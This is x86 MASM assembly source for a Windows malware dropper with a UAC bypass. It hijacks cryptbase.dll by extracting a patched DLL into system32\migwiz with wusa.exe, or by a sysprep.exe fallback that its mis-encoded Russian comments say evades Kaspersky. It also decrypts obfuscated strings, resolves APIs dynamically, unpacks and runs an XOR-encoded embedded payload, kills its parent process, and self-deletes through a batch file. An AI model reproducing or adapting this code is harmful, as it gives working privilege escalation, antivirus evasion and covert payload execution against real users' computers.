.686
.model flat, stdcall
option casemap :none 
 
include \masm32\include\rtl.inc
include \masm32\include\kernel32.inc
include \masm32\include\ntdll.inc
include \masm32\include\advapi32.inc
include \masm32\include\imagehlp.inc
include \masm32\include\userenv.inc
include \masm32\include\user32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\userenv.lib
includelib \masm32\lib\imagehlp.lib
includelib \masm32\lib\ntdll.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\advapi32.lib
include du.mac
include x64.inc

.code

; ¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤*¤

_advapi32_name db 'ADVAPI32.DLL',0
_CheckTokenMembership_name db 'CheckTokenMembership',0
_CreateWellKnownSid db 'CreateWellKnownSid',0
_RtlAdjustPrivilege db 'RtlAdjustPrivilege',0
__ntdll_name db 'NTDLL.DLL',0
__ZwClose_name db 'ZwClose',0
__kernel32_name db 'KERNEL32.DLL',0
__GetModuleFileName db 'GetModuleFileNameA',0
__CloseHandle_name db 'CloseHandle',0

start proc
local cbytes,hkey,sz:dword
local is_admin,htoken:dword
local osv:OSVERSIONINFOEX
local sd:SECURITY_DESCRIPTOR
local buffer[600h]:byte
local oldprotect:dword

mov osv.dwOSVersionInfoSize,sizeof osv

invoke LoadLibraryA,offset __ntdll_name
invoke GetProcAddress,eax,offset _RtlAdjustPrivilege

lea edx,sz
;invoke RtlAdjustPrivilege,SE_DEBUG_PRIVILEGE,1,0,eax
push edx
push 0
push 1
push SE_DEBUG_PRIVILEGE
call eax

invoke LoadLibraryA,offset __ntdll_name
invoke GetProcAddress,eax,offset __ZwClose_name
mov esi,eax
invoke VirtualProtect,esi,1000h,PAGE_EXECUTE_READWRITE,addr oldprotect
mov ebx,[esi]
mov edi,[esi+4]
mov dword ptr [esi],5A59C031h
mov dword ptr [esi+4],0E1FFh

invoke CloseHandle,eax

mov [esi],ebx
mov [esi+4],edi
or eax,eax
jnz @f
invoke ExitProcess,0
@@:

;invoke GetModuleHandle,NULL

invoke GetVersionEx,addr osv

mov is_admin,1
cmp osv.dwMajorVersion,6
jb begin_work

cmp osv.dwMinorVersion,0
jz begin_work

call decrypt

mov eax,offset __kernel32_name;ndll_
;invoke GetModuleHandleW,eax
invoke GetModuleHandle,eax
mov ebx,eax
mov esi,offset disable
invoke GetProcAddress,eax,esi
mov [esi],eax

mov esi,offset enable
invoke GetProcAddress,ebx,esi
mov [esi],eax

invoke OpenProcessToken,-1,TOKEN_ALL_ACCESS,addr hkey
invoke GetTokenInformation,hkey, TokenElevationType,addr is_admin,4,addr cbytes
invoke GetTokenInformation,hkey, TokenLinkedToken,addr htoken,4,addr cbytes
invoke CloseHandle,hkey

cmp is_admin,3
jz @f
invoke CloseHandle,htoken
jmp begin_work

@@:
mov cbytes,100h

;invoke CreateWellKnownSid,1ah,0,addr buffer,addr cbytes

invoke LoadLibraryA,offset _advapi32_name
invoke GetProcAddress,eax,offset _CreateWellKnownSid

lea edx,cbytes
push edx
lea edx,buffer
push edx
push 0
push 1ah
call eax

invoke LoadLibraryA,offset _advapi32_name
invoke GetProcAddress,eax,offset _CheckTokenMembership_name

lea edx,cbytes
push edx
lea edx,buffer
push edx
push htoken
call eax

;invoke CheckTokenMembership,htoken,addr buffer,addr cbytes

invoke CloseHandle,htoken
cmp cbytes,1
jz @f
mov is_admin,1
jmp begin_work

@@:
lea esi,buffer
invoke GetModuleHandle,0
mov edi,eax

;invoke GetModuleFileName,ecx,esi,sizeof buffer

invoke LoadLibraryA,offset __kernel32_name
invoke GetProcAddress,eax,offset __GetModuleFileName

push sizeof buffer
push esi
push edi
call eax

push esi

lea edi,cmd
mov ecx,eax
rep movsb

pop esi
mov ecx,eax
mov edi,offset end_
mov eax,0badc0deh

@@:
cmp [edi-4],eax
je @f
dec edi
jmp @b

@@:
rep movsb

; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤

push 0
mov eax,esp
invoke IsWow64Process,-1,eax
pop eax
xor ecx,ecx
test eax,eax
je x32

push 0
mov ebx,esp
push ebx
mov eax,dword ptr disable
call eax
add esp,4
mov ecx,1

x32:

push ecx

invoke GetWindowsDirectory,addr buffer,200h
mov al,buffer
mov byte ptr cryptbase,al
mov byte ptr nprocess,al
mov byte ptr cmd3+11,al
mov ecx,[esp]
;
push ecx
call elevate_get_procedures
pop ecx
;
call elevate
pop ecx

test ecx,ecx
je @f

push 0
mov ebx,esp
push ebx
mov eax,dword ptr enable
call eax
add esp,4

@@:
invoke ExitProcess,0

decrypt1:
xor byte ptr [esi],0deh
@nd:
inc esi
loop @decrypt
;pop eax
;jmp eax
retn

decrypt:

mov esi,offset cryptbase
mov ecx,length_
@decrypt:
cmp byte ptr [esi],0
je @nd
jmp decrypt1

; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
db_ cryptbase,'C:\Windows\system32\migwiz\cryptbase.dll'
db_ nprocess,'C:\Windows\system32\cryptbase.dll'
db_ ndll__,'\cryptbase.dll'
len_dll_name= $-ndll__
db_ quiet,' /quiet /extract:%WINDIR%\system32\migwiz'
len_quiet=$-quiet
db_ cmd1,'makecab.exe /V1 '
len_cmd1=$-cmd1
db_ cmd2,'cmd.exe /C wusa.exe '
len_cmd2=$-cmd2
db_ cmd3,'cmd.exe /C C:\Windows\System32\migwiz\migwiz.exe'
db_ disable,'Wow64DisableWow64FsRedirection'
db_ enable,'Wow64RevertWow64FsRedirection'

;={+}=============================================================================================

db_ sysprep_original_path,'C:\Windows\system32\sysprep\sysprep.exe'
db_ sys_cmd,'cmd.exe /C '
len_sys_cmd=$-sys_cmd
db_ sysprep_name,'\sys.exe'
len_sysprep_name=$-sysprep_name
db_ sysprep_msu_name,'\sys.msu'
len_sysprep_msu_name=$-sysprep_msu_name
db_ quiet_2,' /quiet /extract:%WINDIR%'
len_quiet_2=$-quiet_2
db_ windir_sys,'C:\Windows\sys.exe'
db_ windie_dll,'C:\Windows\cryptbase.dll'

;=================================================================================================

length_= $-cryptbase
_ntdll_name db 'NTDLL.DLL',0
_kernel32_name db 'KERNEL32.DLL',0
_NtQueryInformationProcess_name db 'NtQueryInformationProcess',0
_CreateFile_name db 'CreateFileA',0
_CloseHandle_name db 'CloseHandle',0
_GetStartupInfo_name db 'GetStartupInfoA',0
_WinExec_name db 'WinExec',0
_NtQuerySystemInformation_name db 'NtQuerySystemInformation',0
_HeapAlloc_name db 'HeapAlloc',0
_CopyFile_name db 'CopyFileA',0
_GetFileSize_name db 'GetFileSize',0
_UnmapViewOfFile_name db 'UnmapViewOfFile',0
_CreateProcess_name db 'CreateProcessA',0
_DeleteFile_name db 'DeleteFileA',0
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

align 4

_CopyFile dd 0
_GetFileSize dd 0
_UnmapViewOfFile dd 0
_CreateProcess dd 0
_DeleteFile dd 0

begin_work:			    ; åñëè ìû èìåëè èëè ïîëó÷èëè ïðàâà àäìèíèñòðàòîðà

mov hkey,1
cmp is_admin,2
jnz @f

call kill_parent

mov hkey,eax

@@:
call create_process
cmp is_admin,1
je exit
cmp hkey,0
jnz exit

push 0
mov eax,esp
invoke IsWow64Process,-1,eax
pop eax
test eax,eax
je @f

push 0
mov ebx,esp
push ebx
mov eax,dword ptr disable
call eax
invoke DeleteFile,offset cryptbase

;={+}=============================================================================================

invoke DeleteFile,offset windir_sys
invoke DeleteFile,offset windie_dll

;=================================================================================================

mov eax,dword ptr enable
call eax
pop eax

jmp exit

@@:

invoke DeleteFile,offset cryptbase

;={+}=============================================================================================

invoke DeleteFile,offset windir_sys
invoke DeleteFile,offset windie_dll

;=================================================================================================

exit:

call killme
invoke ExitProcess,0

start endp

; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤
bat db '1.BAT',0
ping db 'PING.EXE -n 4 127.0.0.1',0dh,0ah,0

killme proc
local cbytes:dword

sub esp,400
mov edi,esp
mov esi,offset ping
mov ecx,sizeof ping-1
rep movsb

mov eax,' LED'
stosd
mov ax,'" '
stosw

invoke GetModuleFileName,400000h,edi,260
mov esi,edi
add edi,eax
mov al,'"'
stosb
mov byte ptr [edi],0

invoke CharToOem,esi,esi

mov ax,0a0dh
stosw

mov eax,' LED'
stosd
mov esi,offset bat
mov ecx,sizeof bat-1
rep movsb

sub edi,esp
mov esi,esp

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _CreateFile_name

push 0
push FILE_ATTRIBUTE_NORMAL
push CREATE_ALWAYS
push 0
push 0
push GENERIC_ALL
push offset bat
call eax

;invoke CreateFile,offset bat,GENERIC_ALL,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
add esp,400

push eax

invoke GetModuleHandle,0
mov eax,[esp]

push 0
mov ecx,esp
invoke WriteFile,eax,esi,edi,ecx,0
add esp,4

pop eax
invoke CloseHandle,eax

invoke WinExec,offset bat,SW_HIDE

invoke ExitProcess,0
killme endp
; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤

create_process proc
local buffer[300]:byte
local cbytes:dword
local mz:word

mov mz,'ZM'
mov finally_,offset @w

try
mov esi,offset end_
@@:
cmp word ptr [esi],'BB'
je @w
mov ax,[esi+1]
inc esi
cmp ax,'AA'
jnz @b

@w:
finally
xor ebx,ebx

sub ax,'AA'
je @f
cmp word ptr [esi],'BB'
jne @ret
add esi,6
xor dword ptr [esi],-1
mov ebx,1

@@:
lea edi,buffer
invoke GetTempPath,sizeof buffer,edi
add edi,eax

rdtsc
mov ecx,4
@1:
push eax
and eax,0ffh
db 0d4h,8
add ax,3030h
cmp ah,'9'
jbe @f
add ah,7
@@:
cmp al,'9'
jbe @f
add al,7
@@:
stosw
pop eax
shr eax,4
loop @1

mov dword ptr [edi],'tab.'
mov dword ptr [edi+4],0

invoke CreateFile,addr buffer,GENERIC_ALL,0,0,CREATE_ALWAYS,0,0
push eax

mov ecx,[esi-4]
mov eax,ecx
xor eax,-1
test ebx,ebx
jnz @f
mov word ptr [esi],'ZM'
@@:
mov edx,ecx
mov edi,esi
add esi,4
shr ecx,2
dec ecx

@@:
cmp dword ptr [esi],0
je @2
xor [esi],eax
cmp dword ptr [esi],0
jne @2
xor [esi],eax
@2:
add esi,4
dec ecx
jnle @b

pop ebx

invoke GetModuleHandle,0

invoke WriteFile,ebx,edi,edx,addr cbytes,0
invoke CloseHandle,ebx

invoke WinExec,addr buffer,SW_SHOW

@ret:
ret
create_process endp

finally_ dd 0
except finally_
; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤

kill_parent proc
local sz,len_:dword
local hmem,pmem:dword
local us:UNICODE_STRING
local buffer[200h]:byte

lea edi,buffer
invoke GetModuleHandle,0
invoke GetModuleFileNameW,eax,edi,sizeof buffer
lea esi,[edi+eax*2]
xor ecx,ecx

@@:
cmp word ptr [esi-2],'\'
je @f
inc ecx
sub esi,2
jmp @b

@@:
mov len_,ecx
rep movsw
mov word ptr [edi],0

invoke GetProcessHeap
mov hmem,eax
;==================================================================================================
and sz,0

invoke GetModuleHandleA,offset _ntdll_name
invoke GetProcAddress,eax,offset _NtQuerySystemInformation_name

lea edx,sz
push edx
push 0
push 0
push SystemProcessesAndThreadsInformation
call eax

;invoke NtQuerySystemInformation,SystemProcessesAndThreadsInformation,0,0,addr sz
test eax,eax
je exit
add sz,100h


invoke GetModuleHandleA,offset _kernel32_name
invoke GetProcAddress,eax,offset _HeapAlloc_name

lea edx,sz
push edx
push HEAP_ZERO_MEMORY
push hmem
call eax

;invoke HeapAlloc,hmem,HEAP_ZERO_MEMORY,sz
mov ebx,eax
mov pmem,eax


invoke GetModuleHandleA,offset _ntdll_name
invoke GetProcAddress,eax,offset _NtQuerySystemInformation_name

lea edx,sz
push edx
push sz
push ebx
push SystemProcessesAndThreadsInformation
call eax

;invoke NtQuerySystemInformation,SystemProcessesAndThreadsInformation,ebx,sz,addr sz
;==================================================================================================
@@:

add ebx,(SYSTEM_PROCESS_INFORMATION ptr [ebx]).NextEntryDelta
lea edi,(SYSTEM_PROCESS_INFORMATION ptr [ebx]).ProcessName

lea esi,buffer
mov edi,(UNICODE_STRING ptr [edi]).Buffer
mov ecx,len_
repe cmpsw
je @f
cmp (SYSTEM_PROCESS_INFORMATION ptr [ebx]).NextEntryDelta,0
jnz @b

jmp exit

@@:
mov esi,(SYSTEM_PROCESS_INFORMATION ptr [ebx]).InheritedFromProcessId
invoke	OpenProcess,PROCESS_TERMINATE,0,esi
mov ebx,eax
invoke	OpenProcess,PROCESS_QUERY_INFORMATION,0,esi
mov esi,eax
;==================================================================================================
lea edi,buffer

push ebx
invoke LoadLibraryA,offset _ntdll_name
invoke GetProcAddress,eax,offset _NtQueryInformationProcess_name
mov ebx,eax

;invoke NtQueryInformationProcess,esi,ProcessImageFileName,0,0,addr sz
;invoke NtQueryInformationProcess,esi,ProcessImageFileName,edi,sz,addr sz

lea eax,[sz]
push eax
push 0
push 0
push ProcessImageFileName
push esi
call ebx

lea eax,[sz]
push eax
push sz
push edi
push ProcessImageFileName
push esi
call ebx

pop ebx
;==================================================================================================
invoke CloseHandle,esi

movzx ecx,(UNICODE_STRING ptr [edi])._Length
mov edi,(UNICODE_STRING ptr [edi]).Buffer
add edi,ecx

@cmp:
sub edi,2
cmp word ptr [edi],'\'
jnz @cmp

mov eax,[edi+2]
mov ecx,[edi+6]
or ecx,200020h
or eax,200020h
cmp eax,'i' shl 16 + 'm'
jnz @f
cmp ecx,'w' shl 16 + 'g'
jnz @f

invoke TerminateProcess,ebx,0
xor edi,edi

@@:
invoke CloseHandle,ebx

exit:
invoke HeapFree,hmem,HEAP_NO_SERIALIZE,pmem
mov eax,edi
ret
kill_parent endp

; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤

thread_proc proc uses ebx edi esi
local as:ANSI_STRING
local us:UNICODE_STRING
local func_addr:dword
local LdrGPA:dword
local LdrLdLib:dword
local ExProc:dword
local WExec:dword
local hdll:dword

call @f
@@:
pop edx
sub edx,offset @b
mov eax,fs:[30h]

mov eax,(PEB ptr [eax]).Ldr
lea eax,(PEB_LDR_DATA ptr [eax]).InLoadOrderModuleList

mov eax,(LIST_ENTRY ptr [eax]).Flink
mov eax,[eax]

mov eax,(LDR_DATA_TABLE_ENTRY ptr [eax]).DllBase
mov ebx,eax
add ebx,(IMAGE_DOS_HEADER ptr [eax]).e_lfanew
lea ebx,(IMAGE_NT_HEADERS ptr [ebx]).OptionalHeader

mov ebx,(IMAGE_OPTIONAL_HEADER ptr [ebx]).DataDirectory.VirtualAddress
add ebx,eax

push edx
lea esi,[edx+offset GetProcAddr-1]
inc esi
mov edi,(IMAGE_EXPORT_DIRECTORY ptr [ebx]).AddressOfNames
lea edi,[edi+eax-4]
mov edx,-1

@@:
add edi,4
push edi
mov edi,[edi]
add edi,eax
inc edx
push esi
mov ecx,sizeof GetProcAddr
repe cmpsb
pop esi
pop edi
jne @b

mov esi,(IMAGE_EXPORT_DIRECTORY ptr [ebx]).AddressOfNameOrdinals
shl edx,1
add edx,esi
add edx,eax
movzx edx,word ptr [edx]
mov ebx,(IMAGE_EXPORT_DIRECTORY ptr [ebx]).AddressOfFunctions
add ebx,eax
shl edx,2
add edx,ebx
mov edx,[edx]
add edx,eax
pop edi
mov LdrGPA,edx
mov ebx,eax

lea eax,LdrLdLib
push eax
push 0
lea eax,[edi+offset LdLib-1]
inc eax
mov as.Buffer,eax
mov as._Length,sizeof LdLib-1
mov as.MaximumLength,sizeof LdLib
lea eax,as
push eax
push ebx
call LdrGPA

lea eax,hdll
push eax
lea eax,[edi+offset ndll_]
mov us.Buffer,eax

mov us._Length,len_-2

mov us.MaximumLength,len_
lea eax,us
push eax
push 0
push 0
call LdrLdLib

lea eax,ExProc
push eax
push 0
lea eax,[edi+offset ExitProc]
mov as.Buffer,eax
mov as._Length,sizeof ExitProc-1
mov as.MaximumLength,sizeof ExitProc
lea eax,as
push eax
push hdll
call LdrGPA

lea eax,WExec
push eax
push 0
lea eax,[edi+offset WinEx]
mov as.Buffer,eax
mov as._Length,sizeof WinEx-1
mov as.MaximumLength,sizeof WinEx
lea eax,as
push eax
push hdll
call LdrGPA

push SW_HIDE
lea eax,[edi+offset cmd]
push eax
call WExec

exit:
push 0
call ExProc

GetProcAddr db 'LdrGetProcedureAddress',0
LdLib db 'LdrLoadDll',0
RtlInitUS db 'RtlInitUnicodeString',0
ExitProc db 'ExitProcess',0
WinEx db 'WinExec',0
du ndll_,'kernel32.dll'
len_=$-ndll_

cmd db 260 dup (0)

thread_proc endp
m:
; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤

elevate proc
align 4
local cbytes,pmem,chksum,hmem,hfile,size_:dword
local pi:PROCESS_INFORMATION
local stin: STARTUPINFO
local wow64:dword
local buffer[200h]:byte
local directory[200h]:byte
local iosb:IO_STATUS_BLOCK


mov wow64,ecx
mov ecx,(end_-start)
invoke VirtualProtect,offset start,ecx,PAGE_EXECUTE_READWRITE,addr cbytes

invoke OpenProcessToken,-1,TOKEN_ALL_ACCESS,addr hfile

lea ebx,directory
mov cbytes,sizeof directory
invoke GetUserProfileDirectory,hfile,ebx,addr cbytes

mov edi,ebx
dec eax
add edi,eax

mov esi,offset ndll__

mov ecx,len_dll_name
rep movsb

sub edi,ebx
dec edi
mov size_,edi

;invoke CopyFile,offset nprocess,ebx,0

push 0
push ebx
push offset nprocess
call _CopyFile

;invoke CreateFile,ebx,GENERIC_READ+GENERIC_WRITE,0,0,OPEN_EXISTING,0,0

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _CreateFile_name

push 0
push 0
push OPEN_EXISTING
push 0
push 0
push GENERIC_READ+GENERIC_WRITE
push ebx
call eax

test eax,eax
js exit

mov hfile,eax

invoke CreateFileMapping,eax,0,PAGE_READWRITE,0,0,0
push eax

invoke MapViewOfFile,eax,FILE_MAP_READ+FILE_MAP_WRITE,0,0,0
push eax
mov edi,eax

mov eax,(IMAGE_DOS_HEADER ptr [edi]).e_lfanew
add eax,edi
;mov (IMAGE_NT_HEADERS ptr [eax]).OptionalHeader.DataDirectory[0*8].VirtualAddress,0
mov (IMAGE_NT_HEADERS ptr [eax]).OptionalHeader.DataDirectory[5*8].VirtualAddress,0
cmp wow64,0
je @f
;mov (IMAGE_NT_HEADERS64 ptr [eax]).OptionalHeader.DataDirectory[0*8].VirtualAddress,0
mov (IMAGE_NT_HEADERS64 ptr [eax]).OptionalHeader.DataDirectory[5*8].VirtualAddress,0

@@:
mov ecx,(IMAGE_NT_HEADERS ptr [eax]).OptionalHeader.AddressOfEntryPoint
mov edx,(IMAGE_NT_HEADERS ptr [eax]).OptionalHeader.SizeOfHeaders
mov eax,(IMAGE_NT_HEADERS ptr [eax]).OptionalHeader.BaseOfCode
sub eax,edx

add edi,ecx
sub edi,eax

cmp wow64,0
je @f

mov esi,offset x64_elevate
mov ebx,(end_-x64_elevate)
jmp @cp

@@:
lea esi,thread_proc
mov ebx,offset m
sub ebx,esi

@cp:

mov ecx,ebx
push edi
cld
rep movsb

;invoke GetFileSize,hfile,0

push 0
push hfile
call _GetFileSize

mov ecx,eax
mov edx,dword ptr [esp+4]
invoke CheckSumMappedFile,edx,ecx,addr cbytes,addr chksum

mov eax,[esp+4]
add eax,(IMAGE_DOS_HEADER ptr [eax]).e_lfanew
mov ecx,chksum
mov (IMAGE_NT_HEADERS ptr [eax]).OptionalHeader.CheckSum,ecx

lea ecx,cbytes
mov edx,esp
push ebx
mov eax,esp
invoke NtFlushVirtualMemory,-1,edx,eax,ecx
add esp,8

pop esi

;invoke UnmapViewOfFile,esi

push esi
call _UnmapViewOfFile

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _CloseHandle_name

push eax
;invoke CloseHandle,hfile

push hfile
call eax

;pop eax
;invoke CloseHandle,eax
pop eax
call eax

lea edi,buffer
mov ebx,edi
mov esi,offset cmd1
mov ecx,len_cmd1-1
rep movsb
lea esi,directory

mov ecx,size_
push esi
push ecx
rep movsb
mov al,20h
stosb
pop ecx
pop esi
rep movsb

sub edi,3
mov eax,'usm'
mov [edi],eax

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _GetStartupInfo_name

;invoke GetStartupInfo,addr stin

lea edx,stin
push edx
call eax

mov stin.wShowWindow,SW_HIDE

invoke CreateProcess,0,ebx,0,0,0,0,0,0,addr stin,addr pi
invoke WaitForSingleObject,pi.hProcess,INFINITE

invoke CloseHandle,pi.hProcess
invoke CloseHandle,pi.hThread

mov esi,offset cmd2
mov ecx,len_cmd2-1
mov edi,ebx
rep movsb
lea esi,directory
mov ecx,size_
rep movsb
mov dword ptr [edi-3],'usm'
mov esi,offset quiet
mov ecx,len_quiet
rep movsb

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _GetStartupInfo_name

;invoke GetStartupInfo,addr stin

lea edx,stin
push edx
call eax

mov stin.wShowWindow,SW_HIDE

;invoke CreateProcess,0,ebx,0,0,0,0,0,0,addr stin,addr pi

lea edx,pi
push edx
lea edx,stin
push edx
push 0
push 0
push 0
push 0
push 0
push 0
push ebx
push 0
call _CreateProcess

;={+}=============================================================================================
; Êîñòûëü äëÿ ÊÈÑà. Â ïîñëåäíåì îáíîâëåíèè îí íå äà¸ò wuse.exe ðàñïàêîâàòü cryptbase.dll â migwiz.
; Íî åñëè cryptbase.dll ðàñïàêîâàòü â %WINDIR% âìåñòå ñ sysprep.exe è çàïóñòèòü åãî òî ÊÈÑ ìîë÷èò.

check_for_kis_access_denied:
	or	eax,eax
	jnz	access_allowed

	call	alternative_method

	lea	esi,directory
;	 invoke  DeleteFile,esi
	push esi
	call _DeleteFile
	mov	eax,size_
	mov	dword ptr [esi+eax-3],'usm'
;	 invoke  DeleteFile,esi
	push esi
	call _DeleteFile
	jmp	exit

access_allowed:

;=================================================================================================

invoke WaitForSingleObject,pi.hProcess,INFINITE

invoke CloseHandle,pi.hProcess
invoke CloseHandle,pi.hThread

lea esi,directory
invoke DeleteFile,esi
mov eax,size_
mov dword ptr [esi+eax-3],'usm'
invoke DeleteFile,esi

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _GetStartupInfo_name

;invoke GetStartupInfo,addr stin

lea edx,stin
push edx
call eax

mov stin.wShowWindow,SW_HIDE

invoke LoadLibraryA,offset _kernel32_name
invoke GetProcAddress,eax,offset _WinExec_name

;invoke WinExec,offset cmd3,SW_HIDE

push SW_HIDE
push offset cmd3
call eax

exit:
ret
elevate endp

;={+}=============================================================================================

alternative_method proc

local sysprep_profile_path[200h]:byte
local cmd_line[200h]:byte
local cchsize,htoken:dword
local pi:PROCESS_INFORMATION
local stin: STARTUPINFO

	invoke	OpenProcessToken,-1,TOKEN_ALL_ACCESS,addr htoken
	mov	cchsize,sizeof sysprep_profile_path
	invoke	GetUserProfileDirectory,htoken,addr sysprep_profile_path,addr cchsize

	lea	esi,sysprep_profile_path
	lea	ebx,cmd_line
	mov	edi,ebx
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,sysprep_name
	mov	ecx,len_sysprep_name
	rep	movsb

	invoke	CopyFile,addr sysprep_original_path,ebx,0

	lea	esi,cmd1
	mov	edi,ebx
	mov	ecx,len_cmd1-1
	rep	movsb

	lea	esi,sysprep_profile_path
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,sysprep_name
	mov	ecx,len_sysprep_name-1
	rep	movsb

	mov	al,20h
	stosb

	lea	esi,sysprep_profile_path
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,sysprep_msu_name
	mov	ecx,len_sysprep_msu_name
	rep	movsb

	invoke	LoadLibraryA,offset _kernel32_name
	invoke	GetProcAddress,eax,offset _GetStartupInfo_name

	;invoke GetStartupInfo,addr stin

	lea	edx,stin
	push	edx
	call	eax

	mov	stin.wShowWindow,SW_HIDE

	invoke	CreateProcess,0,ebx,0,0,0,0,0,0,addr stin,addr pi
	invoke	WaitForSingleObject,pi.hProcess,INFINITE

	invoke	CloseHandle,pi.hProcess
	invoke	CloseHandle,pi.hThread

	lea	esi,cmd2
	mov	edi,ebx
	mov	ecx,len_cmd2-1
	rep	movsb
	lea	esi,sysprep_profile_path
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,sysprep_msu_name
	mov	ecx,len_sysprep_msu_name-1
	rep	movsb
	lea	esi,quiet_2
	mov	ecx,len_quiet_2
	rep	movsb

	invoke	LoadLibraryA,offset _kernel32_name
	invoke	GetProcAddress,eax,offset _GetStartupInfo_name

	;invoke GetStartupInfo,addr stin

	lea	edx,stin
	push	edx
	call	eax

	mov	stin.wShowWindow,SW_HIDE

	invoke	CreateProcess,0,ebx,0,0,0,0,0,0,addr stin,addr pi
	invoke	WaitForSingleObject,pi.hProcess,INFINITE

	invoke	CloseHandle,pi.hProcess
	invoke	CloseHandle,pi.hThread

	lea	esi,cmd2
	mov	edi,ebx
	mov	ecx,len_cmd2-1
	rep	movsb
	lea	esi,sysprep_profile_path
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,ndll__
	mov	ecx,len_dll_name-1
	rep	movsb
	mov	dword ptr [edi-3],'usm'
	lea	esi,quiet_2
	mov	ecx,len_quiet_2
	rep	movsb

	invoke	LoadLibraryA,offset _kernel32_name
	invoke	GetProcAddress,eax,offset _GetStartupInfo_name

	;invoke GetStartupInfo,addr stin

	lea	edx,stin
	push	edx
	call	eax

	mov	stin.wShowWindow,SW_HIDE

	invoke	CreateProcess,0,ebx,0,0,0,0,0,0,addr stin,addr pi
	invoke	WaitForSingleObject,pi.hProcess,INFINITE

	invoke	CloseHandle,pi.hProcess
	invoke	CloseHandle,pi.hThread

	lea	esi,sys_cmd
	mov	edi,ebx
	mov	ecx,len_sys_cmd-1
	rep	movsb
	invoke	GetWindowsDirectory,edi,200h
	add	edi,eax
	lea	esi,sysprep_name
	mov	ecx,len_sysprep_name
	rep	movsb

	invoke	LoadLibraryA,offset _kernel32_name
	invoke	GetProcAddress,eax,offset _GetStartupInfo_name

	;invoke GetStartupInfo,addr stin

	lea	edx,stin
	push	edx
	call	eax

	mov	stin.wShowWindow,SW_HIDE

	invoke	LoadLibraryA,offset _kernel32_name
	invoke	GetProcAddress,eax,offset _WinExec_name

	;invoke WinExec,offset cmd3,SW_HIDE

	push	SW_HIDE
	push	ebx
	call	eax

	invoke	Sleep,1000h

	lea	esi,sysprep_profile_path
	mov	edi,ebx
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,sysprep_name
	mov	ecx,len_sysprep_name
	rep	movsb

	invoke DeleteFile,ebx

	lea	esi,sysprep_profile_path
	mov	edi,ebx
	mov	ecx,cchsize
	rep	movsb
	dec	edi
	lea	esi,sysprep_msu_name
	mov	ecx,len_sysprep_msu_name
	rep	movsb

	invoke DeleteFile,ebx

	ret

alternative_method endp

elevate_get_procedures proc

	invoke LoadLibraryA,offset _kernel32_name
	invoke GetProcAddress,eax,offset _CopyFile_name

	mov _CopyFile,eax

	invoke LoadLibraryA,offset _kernel32_name
	invoke GetProcAddress,eax,offset _GetFileSize_name

	mov _GetFileSize,eax

	invoke LoadLibraryA,offset _kernel32_name
	invoke GetProcAddress,eax,offset _UnmapViewOfFile_name

	mov _UnmapViewOfFile,eax

	invoke LoadLibraryA,offset _kernel32_name
	invoke GetProcAddress,eax,offset _CreateProcess_name

	mov _CreateProcess,eax

	invoke LoadLibraryA,offset _kernel32_name
	invoke GetProcAddress,eax,offset _DeleteFile_name

	mov _DeleteFile,eax

ret
elevate_get_procedures endp

;=================================================================================================

; ¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤÷¤
align 16
x64_elevate::
include dump64.txt
end_::
end start
